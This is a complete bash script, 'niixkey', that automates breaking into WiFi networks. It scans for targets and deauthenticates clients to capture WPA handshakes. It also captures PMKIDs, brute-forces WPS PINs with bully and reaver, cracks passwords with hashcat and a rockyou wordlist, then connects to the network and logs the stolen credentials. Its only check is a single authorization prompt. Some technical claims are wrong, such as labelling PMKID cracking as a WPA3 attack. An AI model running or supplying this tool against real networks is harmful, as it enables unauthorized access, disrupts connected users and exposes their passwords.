#!/bin/bash
# niixkey - Automated WiFi Security Tool
# Version 1.61 - by TomTeal
# For educational/ethical purposes only

# =====[ CONFIG ]=====
WORDLISTS_DIR="/usr/share/wordlists"
WORKSPACE="$HOME/niixkey_scan"
LOG_FILE="$WORKSPACE/niixkey.log"
MAX_ATTEMPTS=3

# Colors for better readability
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# =====[ BANNER ]=====
clear
echo -e "${PURPLE}"
echo " ███▄    █  ██▓ ██▓▒██   ██▒ ██ ▄█▀▓█████ ▓██   ██▓"
echo " ██ ▀█   █ ▓██▒▓██▒▒▒ █ █ ▒░ ██▄█▒ ▓█   ▀  ▒██  ██▒"
echo "▓██  ▀█ ██▒▒██▒▒██▒░░  █   ░▓███▄░ ▒███     ▒██ ██░"
echo "▓██▒  ▐▌██▒░██░░██░ ░ █ █ ▒ ▓██ █▄ ▒▓█  ▄   ░ ▐██▓░"
echo "▒██░   ▓██░░██░░██░▒██▒ ▒██▒▒██▒ █▄░▒████▒  ░ ██▒▓░"
echo "░ ▒░   ▒ ▒ ░▓  ░▓  ▒▒ ░ ░▓ ░▒ ▒▒ ▓▒░░ ▒░ ░   ██▒▒▒ "
echo "░ ░░   ░ ▒░ ▒ ░ ▒ ░░░   ░▒ ░░ ░▒ ▒░ ░ ░  ░ ▓██ ░▒░ "
echo "   ░   ░ ░  ▒ ░ ▒ ░ ░    ░  ░ ░░ ░    ░    ▒ ▒ ░░  "
echo "         ░  ░   ░   ░    ░  ░  ░      ░  ░ ░ ░     "
echo "                                           ░ ░     "
echo -e "${NC}"
echo "  Automated WiFi Assessment Tool v1.61"
echo "  by TomTeal - For legal pentesting only"
echo "  ------------------------------------"
echo ""

# =====[ INITIAL CHECKS ]=====
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}[!] Error: This script must be run as root${NC}"
   exit 1
fi

check_tools() {
    echo -e "\n${BLUE}[*] Checking required tools...${NC}"
    required=("aircrack-ng" "hcxdumptool" "hashcat" "macchanger" "iw")
   
    for cmd in "${required[@]}"; do
        if ! command -v "$cmd" >/dev/null 2>&1; then
            missing+=("$cmd")
        fi
    done
   
    if [[ ${#missing[@]} -gt 0 ]]; then
        echo -e "${YELLOW}[!] Missing tools: ${missing[*]}${NC}"
        read -p "[?] Install them now? (y/n) " -n 1 -r
        echo
        if [[ $REPLY =~ ^[Yy]$ ]]; then
            apt update && apt install -y "${missing[@]}" || {
                echo -e "${RED}[X] Installation failed${NC}"
                exit 1
            }
        else
            exit 1
        fi
    fi
    echo -e "${GREEN}[+] All required tools are installed${NC}"
}

# =====[ LEGAL DISCLAIMER ]=====
echo -e "${RED}[!] LEGAL NOTICE${NC}"
echo "This tool is for authorized security testing and educational"
echo "purposes only. Unauthorized use against networks you don't"
echo "own or have permission to test is illegal."
echo ""
read -p "[?] Do you have proper authorization? (y/n) " -n 1 -r
echo
if [[ ! $REPLY =~ ^[Yy]$ ]]; then
    echo -e "${RED}[X] Aborting...${NC}"
    exit 1
fi

# =====[ MAIN FUNCTIONS ]=====
setup_environment() {
    echo -e "\n${BLUE}[*] Setting up workspace${NC}"
    mkdir -p "$WORKSPACE"
    echo "[+] Scan started $(date)" > "$LOG_FILE"
   
    # Find wireless interfaces
    interfaces=($(iw dev | awk '/Interface/{print $2}'))
    if [[ ${#interfaces[@]} -eq 0 ]]; then
        echo -e "${RED}[X] No wireless interfaces found${NC}"
        exit 1
    fi
   
    # Interface selection
    echo -e "\n${GREEN}[+] Available interfaces:${NC}"
    for i in "${!interfaces[@]}"; do
        driver=$(ethtool -i "${interfaces[$i]}" 2>/dev/null | awk '/driver:/{print $2}')
        echo "[$i] ${interfaces[$i]} (${driver:-unknown driver})"
    done
   
    while true; do
        read -p "[?] Select interface: " iface_choice
        if [[ $iface_choice =~ ^[0-9]+$ ]] && [[ $iface_choice -lt ${#interfaces[@]} ]]; then
            INTERFACE="${interfaces[$iface_choice]}"
            break
        fi
        echo -e "${RED}[!] Invalid selection${NC}"
    done
   
    # Monitor mode setup
    echo -e "\n${BLUE}[*] Configuring monitor mode${NC}"
    airmon-ng check kill >/dev/null 2>&1
    if ! airmon-ng start "$INTERFACE" >/dev/null 2>&1; then
        echo -e "${RED}[X] Failed to enable monitor mode${NC}"
        exit 1
    fi
    MON_IFACE=$(airmon-ng | grep "$INTERFACE" | awk '{print $2}')
    echo -e "${GREEN}[+] Using monitor interface: $MON_IFACE${NC}"
}

scan_networks() {
    echo -e "\n${BLUE}[*] Scanning for targets (15 seconds)${NC}"
    timeout 15 airodump-ng "$MON_IFACE" -w "$WORKSPACE/scan" --output-format csv >/dev/null 2>&1
   
    # Parse results
    targets=()
    while IFS= read -r line; do
        targets+=("$line")
    done < <(grep -E "WPA[2-3]" "$WORKSPACE/scan-01.csv" | awk -F',' '{print $1,$4,$6,$9}' | tr -d '"')
   
    if [[ ${#targets[@]} -eq 0 ]]; then
        echo -e "${RED}[X] No WPA2/WPA3 networks found${NC}"
        exit 1
    fi
   
    # Display targets
    echo -e "\n${GREEN}[+] Discovered networks:${NC}"
    echo "----------------------------------------"
    printf "%-3s %-18s %-6s %-4s %s\n" "#" "BSSID" "CH" "PWR" "ESSID"
    echo "----------------------------------------"
    for i in "${!targets[@]}"; do
        IFS=' ' read -r bssid ch pwr essid <<< "${targets[$i]}"
        printf "%-3d %-18s %-6s %-4s %s\n" "$i" "$bssid" "$ch" "$pwr" "$essid"
    done
   
    # Target selection
    while true; do
        read -p "[?] Select target number: " target_num
        if [[ $target_num =~ ^[0-9]+$ ]] && [[ $target_num -lt ${#targets[@]} ]]; then
            IFS=' ' read -r BSSID CHANNEL POWER ESSID <<< "${targets[$target_num]}"
            echo -e "\n${GREEN}[+] Selected target:${NC}"
            echo "  ESSID:  $ESSID"
            echo "  BSSID:  $BSSID"
            echo "  Channel: $CHANNEL"
            echo "  Power:  $POWER dBm"
           
            # Detect WPA version
            if grep -q "$BSSID.*WPA3" "$WORKSPACE/scan-01.csv"; then
                ENCRYPTION="WPA3"
            else
                ENCRYPTION="WPA2"
            fi
            echo "  Encryption: $ENCRYPTION"
            break
        fi
        echo -e "${RED}[!] Invalid selection${NC}"
    done
}

select_wordlist() {
    echo -e "\n${BLUE}[*] Wordlist selection${NC}"
    wordlists=($(find "$WORDLISTS_DIR" -type f \( -name "*.txt" -o -name "*.lst" \) 2>/dev/null))
   
    if [[ ${#wordlists[@]} -eq 0 ]]; then
        echo -e "${YELLOW}[!] No wordlists found in $WORDLISTS_DIR${NC}"
        echo -e "${BLUE}[*] Downloading rockyou.txt...${NC}"
        wget -q "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt.gz" -O "$WORDLISTS_DIR/rockyou.txt.gz"
        gunzip "$WORDLISTS_DIR/rockyou.txt.gz"
        wordlists=("$WORDLISTS_DIR/rockyou.txt")
    fi
   
    echo -e "\n${GREEN}[+] Available wordlists:${NC}"
    for i in "${!wordlists[@]}"; do
        size=$(du -h "${wordlists[$i]}" | cut -f1)
        count=$(wc -l < "${wordlists[$i]}")
        echo "[$i] ${wordlists[$i]} ($size, $count passwords)"
    done
   
    echo -e "\n${CYAN}[*] Pro tip: Use targeted wordlists for better results${NC}"
    while true; do
        read -p "[?] Select wordlist number or 'c' for custom path: " choice
        case $choice in
            [0-9]*)
                if [[ $choice -lt ${#wordlists[@]} ]]; then
                    WORDLIST="${wordlists[$choice]}"
                    break
                fi
                ;;
            c|C)
                read -p "[?] Enter full path to wordlist: " custom_path
                if [[ -f "$custom_path" ]]; then
                    WORDLIST="$custom_path"
                    break
                else
                    echo -e "${RED}[!] File not found${NC}"
                fi
                ;;
            *)
                echo -e "${RED}[!] Invalid option${NC}"
                ;;
        esac
    done
    echo -e "${GREEN}[+] Selected wordlist: $WORDLIST${NC}"
}

capture_handshake() {
    echo -e "\n${BLUE}[*] Attempting handshake capture${NC}"
    HANDSHAKE_FILE="$WORKSPACE/handshake_$(date +%s).cap"
   
    timeout 30 airodump-ng -c "$CHANNEL" --bssid "$BSSID" -w "$HANDSHAKE_FILE" "$MON_IFACE" >/dev/null 2>&1 &
    AIRODUMP_PID=$!
   
    sleep 5  # Give airodump time to initialize
    echo -e "${YELLOW}[*] Sending deauthentication packets...${NC}"
    aireplay-ng --deauth 5 -a "$BSSID" "$MON_IFACE" >/dev/null 2>&1
   
    echo -e "${CYAN}[*] Waiting for handshake... (30 seconds)${NC}"
    for i in {1..15}; do
        if aircrack-ng "$HANDSHAKE_FILE" 2>/dev/null | grep -q "1 handshake"; then
            kill $AIRODUMP_PID 2>/dev/null
            echo -e "${GREEN}[+] Handshake captured!${NC}"
            return 0
        fi
        sleep 2
    done
   
    kill $AIRODUMP_PID 2>/dev/null
    echo -e "${RED}[!] Failed to capture handshake${NC}"
    return 1
}

capture_pmkid() {
    echo -e "\n${BLUE}[*] Attempting PMKID capture${NC}"
    PMKID_FILE="$WORKSPACE/pmkid_$(date +%s).pcapng"
   
    timeout 60 hcxdumptool -i "$MON_IFACE" -o "$PMKID_FILE" --enable_status=1 --filterlist="$BSSID" --filtermode=2
   
    echo -e "\n${CYAN}[*] Converting capture to hash format...${NC}"
    hcxpcapngtool -o "$WORKSPACE/pmkid.hash" "$PMKID_FILE" >/dev/null 2>&1
   
    if [[ -s "$WORKSPACE/pmkid.hash" ]]; then
        echo -e "${GREEN}[+] PMKID captured!${NC}"
        return 0
    fi
    echo -e "${RED}[!] Failed to capture PMKID${NC}"
    return 1
}

run_wps_attack() {
    echo -e "\n${BLUE}[*] Attempting WPS PIN attack${NC}"
   
    # Try bully first (usually faster)
    echo -e "${YELLOW}[*] Trying bully (timeout: 5 minutes)...${NC}"
    timeout 300 bully -b "$BSSID" -c "$CHANNEL" "$MON_IFACE" -v 3 -L
   
    if [[ $? -eq 0 ]]; then
        CRACKED_PASS=$(grep "WPA PSK" /root/.bully/*.wpc 2>/dev/null | awk '{print $NF}')
        return 0
    fi
   
    # Fallback to reaver if bully fails
    echo -e "\n${YELLOW}[*] Trying reaver (timeout: 10 minutes)...${NC}"
    timeout 600 reaver -i "$MON_IFACE" -b "$BSSID" -vv -K 1 -d 5 -c "$CHANNEL"
   
    if [[ $? -eq 0 ]]; then
        CRACKED_PASS=$(grep "WPA PSK" /usr/local/etc/reaver/*.wpc 2>/dev/null | awk '{print $NF}')
        return 0
    fi
   
    return 1
}

crack_password() {
    case $ENCRYPTION in
        "WPA2")
            echo -e "\n${BLUE}[*] Cracking WPA2 handshake with hashcat...${NC}"
            hashcat -m 22000 "$HANDSHAKE_FILE" "$WORDLIST" --force | tee "$WORKSPACE/wpa2_crack.txt"
           
            if grep -q "Cracked" "$WORKSPACE/wpa2_crack.txt"; then
                CRACKED_PASS=$(hashcat -m 22000 "$HANDSHAKE_FILE" --show | cut -d':' -f3)
                echo -e "${GREEN}[+] Password found: $CRACKED_PASS${NC}"
                return 0
            fi
            ;;
        "WPA3")
            echo -e "\n${BLUE}[*] Cracking WPA3 PMKID with hashcat...${NC}"
            hashcat -m 16800 "$WORKSPACE/pmkid.hash" "$WORDLIST" --force | tee "$WORKSPACE/wpa3_crack.txt"
           
            if grep -q "Cracked" "$WORKSPACE/wpa3_crack.txt"; then
                CRACKED_PASS=$(hashcat -m 16800 "$WORKSPACE/pmkid.hash" --show | cut -d':' -f3)
                echo -e "${GREEN}[+] Password found: $CRACKED_PASS${NC}"
                return 0
            fi
            ;;
    esac
   
    echo -e "${RED}[!] Password not found in wordlist${NC}"
    return 1
}

connect_to_network() {
    echo -e "\n${BLUE}[*] Attempting to connect to $ESSID${NC}"
   
    # Clean up monitor mode
    airmon-ng stop "$MON_IFACE" >/dev/null 2>&1
    ip link set "$INTERFACE" down
    iwconfig "$INTERFACE" mode managed
    ip link set "$INTERFACE" up
   
    # Generate wpa_supplicant config
    WPA_CONF="/tmp/wpa_supplicant.conf"
    cat > "$WPA_CONF" << EOF
network={
    ssid="$ESSID"
    psk="$CRACKED_PASS"
}
EOF

    # Connect
    wpa_supplicant -B -i "$INTERFACE" -c "$WPA_CONF" -D nl80211,wext
    dhclient "$INTERFACE"
   
    # Verify connection
    sleep 5
    if iwconfig "$INTERFACE" | grep -q "$ESSID"; then
        IP_ADDR=$(ip -o -4 addr show "$INTERFACE" | awk '{print $4}')
        echo -e "${GREEN}[+] Successfully connected!${NC}"
        echo -e "  Network: $ESSID"
        echo -e "  Password: $CRACKED_PASS"
        echo -e "  IP Address: $IP_ADDR"
       
        # Save results
        echo "==================================" >> "$WORKSPACE/cracked.txt"
        echo "ESSID: $ESSID" >> "$WORKSPACE/cracked.txt"
        echo "BSSID: $BSSID" >> "$WORKSPACE/cracked.txt"
        echo "Password: $CRACKED_PASS" >> "$WORKSPACE/cracked.txt"
        echo "Cracked at: $(date)" >> "$WORKSPACE/cracked.txt"
        echo "==================================" >> "$WORKSPACE/cracked.txt"
       
        return 0
    fi
   
    echo -e "${RED}[!] Failed to connect automatically${NC}"
    echo -e "${YELLOW}[*] You can try connecting manually with:${NC}"
    echo -e "  SSID: $ESSID"
    echo -e "  Password: $CRACKED_PASS"
    return 1
}

automated_attack() {
    attempts=0
    while [[ $attempts -lt $MAX_ATTEMPTS ]]; do
        case $ENCRYPTION in
            "WPA2")
                if capture_handshake; then
                    crack_password && return 0
                fi
                ;;
            "WPA3")
                if capture_pmkid; then
                    crack_password && return 0
                fi
                ;;
        esac

        # Fallback to WPS if available
        if grep -q "WPS" "$WORKSPACE/scan-01.csv"; then
            echo -e "${YELLOW}[!] Attempting WPS fallback...${NC}"
            run_wps_attack && return 0
        fi

        attempts=$((attempts + 1))
        echo -e "${YELLOW}[!] Attempt $attempts failed. Retrying...${NC}"
        sleep 5
    done

    echo -e "${RED}[X] Failed to crack $ESSID after $MAX_ATTEMPTS attempts${NC}"
    return 1
}

# =====[ MAIN EXECUTION ]=====
check_tools
setup_environment
scan_networks
select_wordlist

if automated_attack; then
    connect_to_network
fi

# =====[ CLEANUP ]=====
cleanup() {
    echo -e "\n${BLUE}[*] Cleaning up...${NC}"
    airmon-ng stop "$MON_IFACE" >/dev/null 2>&1
    service NetworkManager restart >/dev/null 2>&1
    echo -e "${GREEN}[+] Done. Results saved to $WORKSPACE${NC}"
    echo -e "${CYAN}[*] Check these files:${NC}"
    echo "- Cracked passwords: $WORKSPACE/cracked.txt"
    echo "- Full log: $LOG_FILE"
    exit 0
}

trap cleanup EXIT
